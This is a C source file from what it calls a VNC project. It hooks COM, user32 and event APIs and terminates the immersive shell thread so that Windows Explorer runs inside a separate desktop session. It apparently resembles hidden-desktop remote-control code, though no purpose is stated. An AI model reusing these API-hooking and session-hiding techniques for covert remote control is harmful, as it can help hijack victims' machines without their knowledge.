//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: shell.c
// $Revision: 148 $
// $Date: 2014-01-29 14:13:12 +0400 (Wed, 29 Jan 2014) $
// description: 
//	special hooks for explorer support in session
//	the main problem is that explorer's com interfaces can 'leak' to the host
//	we route com call back to explorer in session
//	besides that we have to virtualize some objects: events, etc

#define INITGUID

#include "vncmain.h"
#include "rt\str.h"
#include "vnc\minicom.h"
#include "vnc\names.h"
#include "minidump\minidump.h"
#include "shell.h"
#include "vncsrv.h"
#include <ShlGuid.h>

//ole32
DECLARE_OLE32_HOOK(CoCreateInstance);
DECLARE_OLE32_HOOK(CoCreateInstanceEx);
DECLARE_OLE32_HOOK(CoGetClassObject);
DECLARE_OLE32_HOOK(CoRegisterClassObject);

#ifdef _ENABLE_WIN8_SUPPORT
// ole32: win8
DECLARE_COMBASE_HOOK(CoCreateInstance);
DECLARE_COMBASE_HOOK(CoCreateInstanceEx);
DECLARE_COMBASE_HOOK(CoGetClassObject);
DECLARE_COMBASE_HOOK(CoRegisterClassObject);

DECLARE_NULL_HOOK(CoCreateInstance);
DECLARE_NULL_HOOK(CoCreateInstanceEx);
DECLARE_NULL_HOOK(CoGetClassObject);
DECLARE_NULL_HOOK(CoRegisterClassObject);

//user32 win8
DECLARE_U32_HOOK(SetImmersiveBackgroundWindow);
HOOK_FUNCTION hook_user32_AcquireIAMKey = 
	{"user32.dll", HF_ORDINAL, "AcquireIAMKey", 2509, &my_AcquireIAMKey, NULL, NULL};
HOOK_FUNCTION hook_user32_EnableIAMAccess = 
	{"user32.dll", HF_ORDINAL, "EnableIAMAccess", 2510, &my_EnableIAMAccess, NULL, NULL};
//win81
HOOK_FUNCTION hook_user32_EnableIAMAccess81 = 
	{"user32.dll", HF_ORDINAL, "EnableIAMAccess", 2510, &my_EnableIAMAccessWin81, NULL, NULL};

DECLARE_NULL_HOOK_ORDINAL(AcquireIAMKey,2509);
DECLARE_NULL_HOOK_ORDINAL(EnableIAMAccess,2510);

HOOK_FUNCTION hook_null_EnableIAMAccess81 = 
	{NULL, HF_ORDINAL, "EnableIAMAccess", 2510, &my_EnableIAMAccessWin81, NULL, NULL};

DECLARE_U32_HOOK(MsgWaitForMultipleObjectsEx);

//win81
DECLARE_NULL_HOOK(PsmRegisterKeyNotification);
HOOK_FUNCTION hook_twinapi_PsmRegisterKeyNotification = 
	{"twinapi.appcore.dll", 0, "PsmRegisterKeyNotification", 0, &my_PsmRegisterKeyNotification, NULL, NULL};

// win8.1 global events virtualization
DECLARE_K32_HOOK(CreateEventW);
DECLARE_K32_HOOK(CreateEventA);
DECLARE_K32_HOOK(CreateEventExW);
DECLARE_K32_HOOK(CreateEventExA);
DECLARE_K32_HOOK(OpenEventW);
DECLARE_K32_HOOK(OpenEventA);

DECLARE_KERNELBASE_HOOK(CreateEventW);
DECLARE_KERNELBASE_HOOK(CreateEventA);
DECLARE_KERNELBASE_HOOK(CreateEventExW);
DECLARE_KERNELBASE_HOOK(CreateEventExA);
DECLARE_KERNELBASE_HOOK(OpenEventW);
DECLARE_KERNELBASE_HOOK(OpenEventA);

DECLARE_NULL_HOOK(CreateEventW);
DECLARE_NULL_HOOK(CreateEventA);
DECLARE_NULL_HOOK(CreateEventExW);
DECLARE_NULL_HOOK(CreateEventExA);
DECLARE_NULL_HOOK(OpenEventW);
DECLARE_NULL_HOOK(OpenEventA);

//win 8.0
// on win 8.0 EnableIAMAccess has 2 arguments
// on win 8.1 it has 3 arguments
static HOOK_DESCRIPTOR g_WndIatHooks80[] =
{
	DEFINE_NULL_IAT_HOOK(EnableIAMAccess),
};

static HOOK_DESCRIPTOR g_WndExpHooks80[] = 
{
	DEFINE_U32_EXP_HOOK(EnableIAMAccess),
};

//win 8.1
// on win 8.0 EnableIAMAccess has 2 arguments
// on win 8.1 it has 3 arguments
static HOOK_DESCRIPTOR g_WndIatHooks81[] =
{
	{&hook_null_EnableIAMAccess81, NULL, HOOK_TYPE_IAT},
	{&hook_null_PsmRegisterKeyNotification, NULL, HOOK_TYPE_IAT}
};

static HOOK_DESCRIPTOR g_WndExpHooks81[] = 
{
	{&hook_user32_EnableIAMAccess81, NULL, HOOK_TYPE_EXPORT},
	{&hook_twinapi_PsmRegisterKeyNotification, NULL, HOOK_TYPE_EXPORT}
};

// win8 specific hooks
static HOOK_DESCRIPTOR g_WndIatHooks8[] =
{
	//OLE
	// on win8 some com functions has been mode to combase.dll
	// we need to make this hooks OS specific
	DEFINE_NULL_IAT_HOOK(CoCreateInstance),
	DEFINE_NULL_IAT_HOOK(CoCreateInstanceEx),
	DEFINE_NULL_IAT_HOOK(CoGetClassObject),
	DEFINE_NULL_IAT_HOOK(CoRegisterClassObject),

	DEFINE_U32_IAT_HOOK(SetImmersiveBackgroundWindow),
	DEFINE_NULL_IAT_HOOK(AcquireIAMKey),
	DEFINE_U32_IAT_HOOK(MsgWaitForMultipleObjectsEx),

	// events
	DEFINE_NULL_IAT_HOOK(CreateEventW),
	DEFINE_NULL_IAT_HOOK(CreateEventA),
	DEFINE_NULL_IAT_HOOK(CreateEventExW),
	DEFINE_NULL_IAT_HOOK(CreateEventExA),
	DEFINE_NULL_IAT_HOOK(OpenEventW),
	DEFINE_NULL_IAT_HOOK(OpenEventA)
};

static HOOK_DESCRIPTOR g_WndExpHooks8[] = 
{
	//OLE
	// on win8 some com functions has been mode to combase.dll
	// we need to make this hooks OS specific
	DEFINE_COMBASE_EXP_HOOK(CoCreateInstance),
	DEFINE_COMBASE_EXP_HOOK(CoCreateInstanceEx),
	DEFINE_COMBASE_EXP_HOOK(CoGetClassObject),
	DEFINE_COMBASE_EXP_HOOK(CoRegisterClassObject),

	DEFINE_U32_EXP_HOOK(SetImmersiveBackgroundWindow),
	DEFINE_U32_EXP_HOOK(AcquireIAMKey),
	DEFINE_U32_EXP_HOOK(MsgWaitForMultipleObjectsEx),

	// events
	DEFINE_KERNELBASE_EXP_HOOK(CreateEventW),
	DEFINE_KERNELBASE_EXP_HOOK(CreateEventA),
	DEFINE_KERNELBASE_EXP_HOOK(CreateEventExW),
	DEFINE_KERNELBASE_EXP_HOOK(CreateEventExA),
	DEFINE_KERNELBASE_EXP_HOOK(OpenEventW),
	DEFINE_KERNELBASE_EXP_HOOK(OpenEventA)
};

#endif //_ENABLE_WIN8_SUPPORT

// win7 specific hooks
static HOOK_DESCRIPTOR g_WndIatHooks[] =
{
	//OLE
	DEFINE_OLE32_IAT_HOOK(CoCreateInstance),
	DEFINE_OLE32_IAT_HOOK(CoCreateInstanceEx),
	DEFINE_OLE32_IAT_HOOK(CoGetClassObject),
	DEFINE_OLE32_IAT_HOOK(CoRegisterClassObject),
};

static HOOK_DESCRIPTOR g_WndExpHooks[] = 
{
	//OLE
	// on win8 some com functions has been mode to combase.dll
	// we need to make this hooks OS specific
	DEFINE_OLE32_EXP_HOOK(CoCreateInstance),
	DEFINE_OLE32_EXP_HOOK(CoCreateInstanceEx),
	DEFINE_OLE32_EXP_HOOK(CoGetClassObject),
	DEFINE_OLE32_EXP_HOOK(CoRegisterClassObject),
};

#ifdef _ENABLE_WIN8_SUPPORT

// for win8
// we need to terminate impressive shell thread 
// to make explorer working properly within session
static BOOL  g_bImShellIsTerminated   = FALSE;
static PVOID g_pImpressiveShellCaller = NULL;
static DWORD g_dwImpressiveShellCountDown = 0;

#define IM_SHELL_START_TIMEOUT        10000 //10 sec

#endif //#ifdef _ENABLE_WIN8_SUPPORT

//////////////////////////////////////////////////////////////////////////
// COM staff

EXTERN_C const CLSID CLSID_ShellWindows;

#ifdef _ENABLE_WIN8_SUPPORT

// windows.impressive.shell
DEFINE_GUID(
	CLSID_ImmersiveShellController,
	0x23650F94, 0x13B8, 0x4F39, 0xB2, 0xC3, 0x81, 0x7E, 0x65, 0x64, 0xA7, 0x56
	);

DEFINE_GUID(
	CLSID_ImmersiveShellProvider,
	0xc2f03a33, 0x21f5, 0x47fa, 0xb4, 0xbb, 0x15, 0x63, 0x62, 0xa2, 0xf2, 0x39
	);
DEFINE_GUID(
	CLSID_ImmersiveShellBroker,
	0x228826af, 0x02e1, 0x4226, 0xa9, 0xe0, 0x99, 0xa8, 0x55, 0xe4, 0x55, 0xa6
	);

//twinui
DEFINE_GUID(
	CLSID_twinui,
	0xc71c41f1, 0xddad, 0x42dc, 0xa8, 0xfc, 0xf5, 0xbf, 0xc6, 0x1d, 0xf9, 0x57
	);

DEFINE_GUID(
	CLSID_RunningShareManager,
	0x7db875bd, 0x1b88, 0x4c5f, 0x9e, 0x4c, 0xed, 0x23, 0xea, 0xff, 0x24, 0xe1
	);
DEFINE_GUID(
	CLSID_SearchPaneWindow,
	0x48c28f80, 0x9fd3, 0x426f, 0x9c, 0x68, 0x73, 0x4f, 0x88, 0x0c, 0xb9, 0x5b
	);
DEFINE_GUID(
	CLSID_UserSessionToastManager,
	0x2241690b, 0x2e92, 0x46ab, 0xb0, 0x54, 0x75, 0x18, 0x55, 0x8b, 0x80, 0xdf
	);
DEFINE_GUID(
	CLSID_FileSearchApp,
	0x787D01C9, 0xAA41, 0x4D81, 0x90, 0xA6, 0x4E, 0x44, 0x55, 0x7C, 0xF9, 0x02
	);
DEFINE_GUID(
	CLSID_SettingsSearchApp,
	0xDCC2B046, 0x8FE3, 0x4F80, 0xBE, 0x16, 0xBD, 0x57, 0x5E, 0x61, 0xA7, 0x18
	);

//win 8.1
DEFINE_GUID(
	CLSID_LockScreenCallBroker,
	0xDE7D3D65, 0x5454, 0x4EF5, 0x95, 0x18, 0x77, 0x67, 0x39, 0xDA, 0xB3, 0x9F
	);

DEFINE_GUID(
	CLSID_ImmersiveSplashScreen,
	0x329B80EC, 0x2230, 0x47B8, 0x90, 0x5D, 0xA2, 0xDC, 0xF5, 0x17, 0x1C, 0x6F
	);

#endif //_ENABLE_WIN8_SUPPORT

//explorerframe.dll
DEFINE_GUID(
	CLSID_ExplorerLauncher,
	0x1F849CCE, 0x2546, 0x4B9F, 0xB0, 0x3E, 0x40, 0x4, 0x78, 0x1B, 0xDC, 0x40
	);

DEFINE_GUID(
	CLSID_CommonExplorerHost,
	0x93A56381, 0xE0CD, 0x485A, 0xB6, 0x0E, 0x67, 0x81, 0x9E, 0x12, 0xF8, 0x1B
	);

DEFINE_GUID(
	CLSID_ShellWindowsCF,
	0xd92bd3b9, 0x99a0, 0x4334, 0xa4, 0x97, 0x11, 0xbc, 0xb0, 0x93, 0xe9, 0xd2
	);

DEFINE_GUID(
	CLSID_DesktopExplorerHost,
	0x682159d9, 0xc321, 0x47ca, 0xb3, 0xf1, 0x30, 0xe3, 0x6b, 0x2e, 0xc8, 0xb9
	);

//shell32
DEFINE_GUID(
	CLSID_NotificationDataProvider,
	0x8b47ed52, 0xe8ef, 0x4c45, 0xa8, 0x64, 0xd1, 0xcc, 0x84, 0x65, 0xfe, 0xde
	);

DEFINE_GUID(
	CLSID_DesktopWallpaper,
	0xc2cf3110, 0x460e, 0x4fc1, 0xb9, 0xd0, 0x8a, 0x1c, 0x0c, 0x9c, 0xc4, 0xbd
	);

//explorer
DEFINE_GUID(
	CLSID_IEClassFactory,
	0xf60ad0a0, 0xe5e1, 0x45cb, 0xb5, 0x1a, 0xe1, 0x5b, 0x9f, 0x8b, 0x29, 0x34
	);

DEFINE_GUID(
	CLSID_IEClassFactory2,
	0x25dead04, 0x1eac, 0x4911, 0x9e, 0x3a, 0xad, 0x0a, 0x4a, 0xb5, 0x60, 0xfd
	);
DEFINE_GUID(
	CLSID_IEClassFactory3,
	0xe6442437, 0x6c68, 0x4f52, 0x94, 0xdd, 0x2c, 0xfe, 0xd2, 0x67, 0xef, 0xb9
	);

//wpncore
DEFINE_GUID(
	CLSID_CWindowsPushNotificationPlatform,
	0x0c9281f9, 0x6da1, 0x4006, 0x87, 0x29, 0xde, 0x6e, 0x6b, 0x61, 0x58, 0x1c
	);

DEFINE_GUID(
	CLSID_IExplorerHost,
	0x489e9453, 0x869b, 0x4bcc, 0xa1, 0xc7, 0x48, 0xb5, 0x28, 0x5f, 0xd9, 0xd8
	);

//authui
DEFINE_GUID(
	CLSID_LockScreenNotificationBroker,
	0xc89fc3ef, 0xa0dc, 0x4feb, 0xbf, 0xbc, 0xf1, 0x3a, 0x9c, 0x33, 0x4d, 0x4f
	);

//pnidui
DEFINE_GUID(
	CLSID_NetworkCategoryHintCF,
	0xc53b4598, 0x5c0e, 0x4dfa, 0xbf, 0x07, 0x30, 0x4a, 0xd4, 0xe0, 0x4e, 0x87
	);

//hgcpl
DEFINE_GUID(
	CLSID_HomeGroupUIStatusCF,
	0x6f33340d, 0x8a01, 0x473a, 0xb7, 0x5f, 0xde, 0xd8, 0x8c, 0x83, 0x60, 0xce
	);

static VIRTUAL_OBJECT g_VirtGuids[] =
{
	{&CLSID_CommonExplorerHost,       L"explorerframe.dll",0},
	{&CLSID_ShellWindowsCF,           L"explorerframe.dll",0},
	{&CLSID_DesktopExplorerHost,      L"explorerframe.dll",VO_INAPP_SERVER},
	{&CLSID_ShellWindows,             L"explorerframe.dll",VO_INAPP_SERVER},
	
	{&CLSID_DesktopWallpaper,         L"shell32.dll",VO_INAPP_SERVER},
	{&CLSID_NotificationDataProvider, L"shell32.dll",0},

	{&CLSID_IEClassFactory,           L"explorer.exe",VO_INAPP_SERVER},
	{&CLSID_IEClassFactory2,           L"explorer.exe",VO_INAPP_SERVER},
	{&CLSID_IEClassFactory3,           L"explorer.exe",VO_INAPP_SERVER},

#ifdef _ENABLE_WIN8_SUPPORT
	{&CLSID_ImmersiveShellController, L"windows.immersiveshell.serviceprovider.dll", 0},
	{&CLSID_ImmersiveShellProvider,   L"windows.immersiveshell.serviceprovider.dll", VO_INAPP_SERVER},
	{&CLSID_ImmersiveShellBroker,     L"windows.immersiveshell.serviceprovider.dll", VO_INAPP_SERVER},

	{&CLSID_twinui,   L"twinui.dll", 0},
	{&CLSID_RunningShareManager,   L"twinui.dll", 0},
	{&CLSID_SearchPaneWindow,   L"twinui.dll", 0},
	{&CLSID_UserSessionToastManager,   L"twinui.dll", VO_DISABLED},
	{&CLSID_FileSearchApp,            L"twinui.dll", 0},
	{&CLSID_SettingsSearchApp,        L"twinui.dll", 0},
	//8.1
	{&CLSID_LockScreenCallBroker,        L"twinui.dll", VO_DISABLED|VO_INAPP_SERVER},
	{&CLSID_ImmersiveSplashScreen,       L"twinui.dll", VO_DISABLED|VO_INAPP_SERVER},
#endif //#ifdef _ENABLE_WIN8_SUPPORT

	{&CLSID_CWindowsPushNotificationPlatform,   L"wpncore.dll", VO_INAPP_SERVER},

	{&CLSID_LockScreenNotificationBroker,   L"authui.dll", VO_INAPP_SERVER},

	{&CLSID_NetworkCategoryHintCF,   L"pnidui.dll", VO_INAPP_SERVER},

	{&CLSID_HomeGroupUIStatusCF,   L"hgcpl.dll", VO_INAPP_SERVER},
	{ NULL, NULL, 0 }
};

static PVIRTUAL_OBJECT _GetVirtualObject( REFCLSID rclsid )
{
	unsigned i;
	for ( i = 0; g_VirtGuids[i].DllName != NULL; i++ ){
		if ( IsEqualGUID(rclsid,g_VirtGuids[i].rclsid) ){
			return &g_VirtGuids[i];
		}
	}
	return NULL;
}



//////////////////////////////////////////////////////////////////////////
// OLD STUFF
HRESULT __stdcall my_CoCreateInstance(
	REFCLSID rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD dwClsContext,
	REFIID riid,
	LPVOID * ppv
	)
{
	HRESULT r;
	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));
	ptr_CoCreateInstance Func_CoCreateInstance;
	PVIRTUAL_OBJECT  Object;

	ENTER_HOOK();

#if 0
	if ( riid == NULL ){
		DbgPrint("clsid={%08X-%04X-%04X-%02X-%02X-%02X-%02X-%02X-%02X-%02X-%02X}\n", 
			rclsid->Data1,
			rclsid->Data2,
			rclsid->Data3,
			rclsid->Data4[0],rclsid->Data4[1],
			rclsid->Data4[2],rclsid->Data4[3],
			rclsid->Data4[4],rclsid->Data4[5],
			rclsid->Data4[6],rclsid->Data4[7]
		);
	}
	else
	{
		DbgPrint(
			"clsid={%08X-%04X-%04X-%02X-%02X-%02X-%02X-%02X-%02X-%02X-%02X} riid={%08X-%04X-%04X-%02X-%02X-%02X-%02X-%02X-%02X-%02X-%02X}\n", 
			rclsid->Data1,
			rclsid->Data2,
			rclsid->Data3,
			rclsid->Data4[0],rclsid->Data4[1],
			rclsid->Data4[2],rclsid->Data4[3],
			rclsid->Data4[4],rclsid->Data4[5],
			rclsid->Data4[6],rclsid->Data4[7],
			riid->Data1,
			riid->Data2,
			riid->Data3,
			riid->Data4[0],riid->Data4[1],
			riid->Data4[2],riid->Data4[3],
			riid->Data4[4],riid->Data4[5],
			riid->Data4[6],riid->Data4[7]
		);
	}
#endif
//#if _DBG
//	MiniDumpStack();
//#endif

	if ( Object = _GetVirtualObject( rclsid ) ){
		r = ComCreateInstance(Object,rclsid,pUnkOuter,dwClsContext,riid,ppv);
	}
	else
	{
#ifdef _ENABLE_WIN8_SUPPORT
		if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)){ // win8
			// Win8
			//Func_CoCreateInstance = DEFINE_COMBASE_PROC(CoCreateInstance);
			Func_CoCreateInstance = (ptr_CoCreateInstance) hook_combase_CoCreateInstance.Original;
		}
		else 
#endif //#ifdef _ENABLE_WIN8_SUPPORT
		{
			// win7 and below
			Func_CoCreateInstance = DEFINE_OLE32_PROC(CoCreateInstance);
		}
		r = Func_CoCreateInstance(rclsid,pUnkOuter,dwClsContext,riid,ppv);
	}

	LEAVE_HOOK();

	return r;
}

HRESULT __stdcall my_CoCreateInstanceEx(
	REFCLSID rclsid,
	IUnknown * punkOuter,
	DWORD dwClsCtx,
	COSERVERINFO * pServerInfo,
	ULONG cmq,
	MULTI_QI * pResults
	)
{
	HRESULT r;
	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));
	ptr_CoCreateInstanceEx Func_CoCreateInstanceEx;
	PVIRTUAL_OBJECT  Object;

	ENTER_HOOK();

	DbgPrint("guid={%08X-%04X-%04X-%02X-%02X-%02X-%02X-%02X-%02X-%02X-%02X}\n", 
		rclsid->Data1,
		rclsid->Data2,
		rclsid->Data3,
		rclsid->Data4[0],rclsid->Data4[1],
		rclsid->Data4[2],rclsid->Data4[3],
		rclsid->Data4[4],rclsid->Data4[5],
		rclsid->Data4[6],rclsid->Data4[7]
	);

#if _DBG
	//MiniDumpStack();
#endif

	if ( Object = _GetVirtualObject( rclsid ) )
	{
		ASSERT(FALSE);
	}

#ifdef _ENABLE_WIN8_SUPPORT
	if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)){ // win8
		// Win8
		//Func_CoCreateInstanceEx = DEFINE_COMBASE_PROC(CoCreateInstanceEx);
		Func_CoCreateInstanceEx = (ptr_CoCreateInstanceEx) hook_combase_CoCreateInstanceEx.Original;
	} 
	else
#endif
	{
		// win7 and below
		Func_CoCreateInstanceEx = DEFINE_OLE32_PROC(CoCreateInstanceEx);
	}
	r = Func_CoCreateInstanceEx(rclsid,punkOuter,dwClsCtx,pServerInfo,cmq,pResults);

	LEAVE_HOOK();
	return r;
}

HRESULT __stdcall my_CoGetClassObject(
	REFCLSID rclsid,
	DWORD dwClsContext,
	COSERVERINFO * pServerInfo,
	REFIID riid,
	LPVOID * ppv
	)
{
	HRESULT r;
	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));
	ptr_CoGetClassObject Func_CoGetClassObject;
	PVIRTUAL_OBJECT  Object;

	ENTER_HOOK();

//	DbgPrint("ret=%p guid={%08X-%04X-%04X-%02X-%02X-%02X-%02X-%02X-%02X-%02X-%02X}\n", 
//		_ReturnAddress(),
//		rclsid->Data1,
//		rclsid->Data2,
//		rclsid->Data3,
//		rclsid->Data4[0],rclsid->Data4[1],
//		rclsid->Data4[2],rclsid->Data4[3],
//		rclsid->Data4[4],rclsid->Data4[5],
//		rclsid->Data4[6],rclsid->Data4[7]
//	);
//
//#if _DBG
//	MiniDumpStack();
//#endif

	if ( Object = _GetVirtualObject( rclsid ) )
	{
		r = ComGetClassObject(Object,rclsid,dwClsContext,pServerInfo,riid,ppv);
	}
	else
	{
	#ifdef _ENABLE_WIN8_SUPPORT
		if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)){ // win8
			// Win8
			//Func_CoGetClassObject = DEFINE_COMBASE_PROC(CoGetClassObject);
			Func_CoGetClassObject = (ptr_CoGetClassObject) hook_combase_CoGetClassObject.Original;
		} 
		else 
	#endif //#ifdef _ENABLE_WIN8_SUPPORT
		{
			// win7 and below
			Func_CoGetClassObject = DEFINE_OLE32_PROC(CoGetClassObject);
		}

		r = Func_CoGetClassObject(rclsid,dwClsContext,pServerInfo,riid,ppv);
	}
	LEAVE_HOOK();

	return r;
}

HRESULT __stdcall my_CoRegisterClassObject(
	REFCLSID rclsid,
	IUnknown * pUnk,
	DWORD dwClsContext,
	DWORD flags,
	LPDWORD  lpdwRegister
	)
{
	HRESULT r;
	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));
	ptr_CoRegisterClassObject Func_CoRegisterClassObject;
	BOOL bPatched = FALSE;
	PVIRTUAL_OBJECT  Object;

	ENTER_HOOK();

//	DbgPrint("ret=%p guid={%08X-%04X-%04X-%02X-%02X-%02X-%02X-%02X-%02X-%02X-%02X}\n", 
//		_ReturnAddress(),
//		rclsid->Data1,
//		rclsid->Data2,
//		rclsid->Data3,
//		rclsid->Data4[0],rclsid->Data4[1],
//		rclsid->Data4[2],rclsid->Data4[3],
//		rclsid->Data4[4],rclsid->Data4[5],
//		rclsid->Data4[6],rclsid->Data4[7]
//	);
//#if _DBG
//	MiniDumpStack();
//#endif

	if ( Object = _GetVirtualObject( rclsid ) )
	{
		r = ComRegisterClassObject(Object,rclsid,pUnk,dwClsContext,flags,lpdwRegister);
	}
	else
	{
	#ifdef _ENABLE_WIN8_SUPPORT
		if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)){ // win8
			// Win8
			//Func_CoGetClassObject = DEFINE_COMBASE_PROC(CoGetClassObject);
			Func_CoRegisterClassObject = (ptr_CoRegisterClassObject) hook_combase_CoRegisterClassObject.Original;
		} 
		else 
	#endif //#ifdef _ENABLE_WIN8_SUPPORT
		{
			// win7 and below
			Func_CoRegisterClassObject = DEFINE_OLE32_PROC(CoRegisterClassObject);
		}

		r = Func_CoRegisterClassObject(rclsid,pUnk,dwClsContext,flags,lpdwRegister);
	}

	LEAVE_HOOK();
	return r;
}
//
// win8 specific
// The following hooks enable win8 support in explorer
//

#ifdef _ENABLE_WIN8_SUPPORT

BOOL __stdcall my_SetImmersiveBackgroundWindow( HWND hWnd )
{
	SetLastError(NO_ERROR);
	return TRUE;
}

BOOL __stdcall my_AcquireIAMKey( PVOID Arg )
{
	SetLastError(NO_ERROR);
	return TRUE;
}

BOOL __stdcall my_EnableIAMAccess( PVOID Arg, DWORD Enable )
{
	SetLastError(NO_ERROR);
	return TRUE;
}

BOOL __stdcall my_EnableIAMAccessWin81( PVOID Arg1, PVOID Arg2, DWORD Enable )
{
	SetLastError(NO_ERROR);
	return TRUE;
}

// f'n special hook for win8
// we need to kill CImmersiveShellController::_ImmersiveShellComponentsThreadProcInternal
// to make f'n explorer running in our session
// MsgWaitForMultipleObjectsEx is a good identifier for that thread
DWORD __stdcall my_MsgWaitForMultipleObjectsEx(
	DWORD nCount,
	HANDLE *pHandles,
	DWORD dwMilliseconds,
	DWORD dwWakeMask,
	DWORD dwFlags
	)
{
	DWORD r;
	PVOID ret = _ReturnAddress();

	ENTER_HOOK();
	if ( g_bImShellIsTerminated == FALSE )
	{
		if ( g_pImpressiveShellCaller == NULL )
		{
			CHAR FileName[MAX_PATH];
			DWORD Length;
			
			// dirty hack
			// we identify dll by caller
			Length = GetMappedFileNameA(GetCurrentProcess(),ret,FileName,MAX_PATH);
			if ( Length ){
				PathStripPath(FileName);
				if ( lstrcmpiA(FileName,"windows.immersiveshell.serviceprovider.dll") == 0 )
				{
					DbgPrint("IM shell detected at\n", ret);
					g_pImpressiveShellCaller = ret;
				}
			}else{
				DbgPrint("GetMappedFileNameA failed, err=%08X, %s!%s\n",
					GetLastError(),g_CurrentProcessName,FileName);
			}
		}

		if ( ret && ret == g_pImpressiveShellCaller )
		{
			if ( g_dwImpressiveShellCountDown == 0 ){
				DbgPrint("we give IM shell %u sec to initialize\n",IM_SHELL_START_TIMEOUT);
				g_dwImpressiveShellCountDown = GetTickCount();
			}
			// we give im 2 seconds to initialize
			if ( GetTickCount() - g_dwImpressiveShellCountDown > IM_SHELL_START_TIMEOUT )
			{
				DbgPrint("terminating the impressive shell\n");
				g_bImShellIsTerminated = TRUE;
				LEAVE_HOOK();

				// Stop the World – I Want to Get Off 
				TerminateThread(GetCurrentThread(),0);
				return WAIT_ABANDONED;
			}
		}
	}
	// call the original
	r = 
		DEFINE_U32_PROC(MsgWaitForMultipleObjectsEx)(
			nCount,
			pHandles,
			dwMilliseconds,
			dwWakeMask,
			dwFlags
			);
	LEAVE_HOOK();
	return r;
}

//twinapi.appcore!PsmRegisterKeyNotification
// registers explorer in some service
// we just disable it
DWORD __stdcall my_PsmRegisterKeyNotification(PVOID Arg1,PVOID Arg2)
{
	SetLastError(NO_ERROR);
	return NO_ERROR;
}

// win8.1 explorer uses named event BINotifiedNewSessionEvent for synchronization!!
// twinui_appcore!CProcessLifetimeManager::PerformDelayedInitialization
// waits on that event for twinui_appcore!BiApiWrapper::NotifyNewSession thread
// and uses class variable for status indication
// it makes some interference of explorer in session and at the host
// event can be set by host before BiApiWrapper::NotifyNewSession has need completed in session
// (moreover, status in calls is initialized with 'unsuccessful' that means that
//  operation fails if event was set before thread completion)
// as result, we need to virtualize BINotifiedNewSessionEvent in session by adding session prefix 
// 
LPCWSTR g_ShellVirtEvent[] = 
{
	L"BINotifiedNewSessionEvent",
	L"StartMenuCacheFileReorder",
	L"ShellReadyEvent",
	L"ShellDesktopSwitchEvent",
	//L"ShellDesktopVisibleEvent",
	NULL
};

static BOOL _IsVirtObjectW(LPCWSTR Name)
{
	int i;

	for ( i = 0; g_ShellVirtEvent[i]; i++ ){
		if ( lstrcmpiW(g_ShellVirtEvent[i],Name) == 0 ){
			return TRUE;
		}
	}
	return FALSE;
}

static BOOL _IsVirtObjectA(LPCSTR Name)
{
	int i;

	for ( i = 0; g_ShellVirtEvent[i]; i++ ){
		if ( StrCmpIWA(g_ShellVirtEvent[i],Name) == 0 ){
			return TRUE;
		}
	}
	return FALSE;
}

HANDLE __stdcall my_CreateEventW(
	LPSECURITY_ATTRIBUTES lpEventAttributes,
	BOOL bManualReset,
	BOOL bInitialState,
	LPCWSTR lpName
	)
{
	DWORD Error = NO_ERROR;
	HANDLE r = NULL;
	LPCWSTR lpNewName = lpName;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data && lpName ){
		if ( _IsVirtObjectW(lpName)){
			lpNewName = DecorateNameW(&g_pSession->Desktop,(LPWSTR)lpName);
			if ( lpNewName ){
				DbgPrint("%S->%S\n",lpName,lpNewName);
			}else{
				Error = GetLastError();
				DbgPrint("DecorateNameW(%S) failed\n",lpName);
			}
		}
	}

	if ( Error == NO_ERROR ){

		r = DEFINE_KERNELBASE_PROC(CreateEventW)(
			lpEventAttributes,
			bManualReset,
			bInitialState,
			lpNewName
			);

		if ( lpNewName != lpName ){
			hFree ( (PVOID)lpNewName );
		}
	}

	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}

	LEAVE_HOOK();
	return r;
}

HANDLE __stdcall my_CreateEventA(
	LPSECURITY_ATTRIBUTES lpEventAttributes,
	BOOL bManualReset,
	BOOL bInitialState,
	LPCSTR lpName
	)
{
	DWORD Error = NO_ERROR;
	HANDLE r = NULL;
	LPCSTR lpNewName = lpName;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data && lpName ){
		if ( _IsVirtObjectA(lpName)){
			lpNewName = DecorateNameA(&g_pSession->Desktop,(LPSTR)lpName);
			if ( lpNewName ){
				DbgPrint("%s->%s\n",lpName,lpNewName);
			}else{
				Error = GetLastError();
				DbgPrint("DecorateNameA(%s) failed\n",lpName);
			}
		}
	}

	if ( Error == NO_ERROR ){
		r = DEFINE_KERNELBASE_PROC(CreateEventA)(
			lpEventAttributes,
			bManualReset,
			bInitialState,
			lpNewName
			);

		if ( lpNewName != lpName ){
			hFree ( (PVOID)lpNewName );
		}
	}

	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}

	LEAVE_HOOK();
	return r;
}

HANDLE __stdcall my_CreateEventExW(
	LPSECURITY_ATTRIBUTES lpEventAttributes,
	LPCWSTR lpName,
	DWORD dwFlags,
	DWORD dwDesiredAccess
	)
{
	DWORD Error = NO_ERROR;
	HANDLE r = NULL;
	LPCWSTR lpNewName = lpName;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data && lpName ){
		if ( _IsVirtObjectW(lpName)){
			lpNewName = DecorateNameW(&g_pSession->Desktop,(LPWSTR)lpName);
			if ( lpNewName ){
				DbgPrint("%S->%S\n",lpName,lpNewName);
			}else{
				Error = GetLastError();
				DbgPrint("DecorateNameW(%S) failed\n",lpName);
			}
		}
	}

	if ( Error == NO_ERROR ){
		r = DEFINE_KERNELBASE_PROC(CreateEventExW)(
			lpEventAttributes,
			lpNewName,
			dwFlags,
			dwDesiredAccess
			);

		if ( lpNewName != lpName ){
